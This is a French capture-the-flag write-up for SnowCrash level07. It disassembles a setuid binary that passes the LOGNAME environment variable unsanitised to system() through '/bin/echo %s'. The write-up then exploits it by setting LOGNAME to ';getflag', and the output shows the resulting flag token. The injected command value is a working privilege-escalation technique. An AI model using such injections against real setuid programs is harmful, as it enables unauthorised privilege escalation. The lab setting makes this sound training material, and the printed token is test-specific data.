# LEVEL 07

### Reconnaissance

On se connecte sur l'utilisateur level07

On tombe sur un binaire, on l'analyse avec r2:

```
[0x08048460]> pdf@main
            ; DATA XREF from entry0 @ 0x8048477
┌ 141: int main (int argc, char **argv, char **envp);
│           ; var uid_t var_20h @ esp+0x4
│           ; var uid_t var_1ch @ esp+0x8
│           ; var char *string @ esp+0x14
│           ; var int32_t var_ch @ esp+0x18
│           ; var uid_t var_8h @ esp+0x1c
│           0x08048514      55             push ebp                    ; /home/user/level07/level07.c:7
│           0x08048515      89e5           mov ebp, esp
│           0x08048517      83e4f0         and esp, 0xfffffff0
│           0x0804851a      83ec20         sub esp, 0x20
│           0x0804851d      e8cefeffff     call sym.imp.getegid        ; /home/user/level07/level07.c:13
│           0x08048522      89442418       mov dword [var_ch], eax
│           0x08048526      e8b5feffff     call sym.imp.geteuid        ; /home/user/level07/level07.c:14 ; uid_t geteuid(void)
│           0x0804852b      8944241c       mov dword [var_8h], eax
│           0x0804852f      8b442418       mov eax, dword [var_ch]     ; /home/user/level07/level07.c:16
│           0x08048533      89442408       mov dword [var_1ch], eax
│           0x08048537      8b442418       mov eax, dword [var_ch]
│           0x0804853b      89442404       mov dword [var_20h], eax
│           0x0804853f      8b442418       mov eax, dword [var_ch]
│           0x08048543      890424         mov dword [esp], eax
│           0x08048546      e805ffffff     call sym.imp.setresgid
│           0x0804854b      8b44241c       mov eax, dword [var_8h]     ; /home/user/level07/level07.c:17
│           0x0804854f      89442408       mov dword [var_1ch], eax
│           0x08048553      8b44241c       mov eax, dword [var_8h]
│           0x08048557      89442404       mov dword [var_20h], eax
│           0x0804855b      8b44241c       mov eax, dword [var_8h]
│           0x0804855f      890424         mov dword [esp], eax
│           0x08048562      e869feffff     call sym.imp.setresuid
│           0x08048567      c74424140000.  mov dword [string], 0       ; /home/user/level07/level07.c:19
│           0x0804856f      c70424808604.  mov dword [esp], str.LOGNAME ; /home/user/level07/level07.c:21 ; [0x8048680:4]=0x4e474f4c ; "LOGNAME" ; const char *name
│           0x08048576      e885feffff     call sym.imp.getenv         ; char *getenv(const char *name)
│           0x0804857b      89442408       mov dword [var_1ch], eax
│           0x0804857f      c74424048886.  mov dword [var_20h], str.bin_echo__s ; [0x8048688:4]=0x6e69622f ; "/bin/echo %s "
│           0x08048587      8d442414       lea eax, dword [string]
│           0x0804858b      890424         mov dword [esp], eax
│           0x0804858e      e8adfeffff     call sym.imp.asprintf
│           0x08048593      8b442414       mov eax, dword [string]     ; /home/user/level07/level07.c:23
│           0x08048597      890424         mov dword [esp], eax        ; const char *string
│           0x0804859a      e871feffff     call sym.imp.system         ; int system(const char *string)
│           0x0804859f      c9             leave                       ; /home/user/level07/level07.c:24
└           0x080485a0      c3             ret
```

On voit qu'il va chercher LOGNAME dans les variables d'environnements et il l'imprime avec echo.

### Exploitation

On va donc mettre **notre** variable d'environnement :)

```
level07@SnowCrash:~$ env -i LOGNAME=";whoami" ./level07 
flag07
level07@SnowCrash:~$ env -i LOGNAME=";getflag" ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Et voila :)



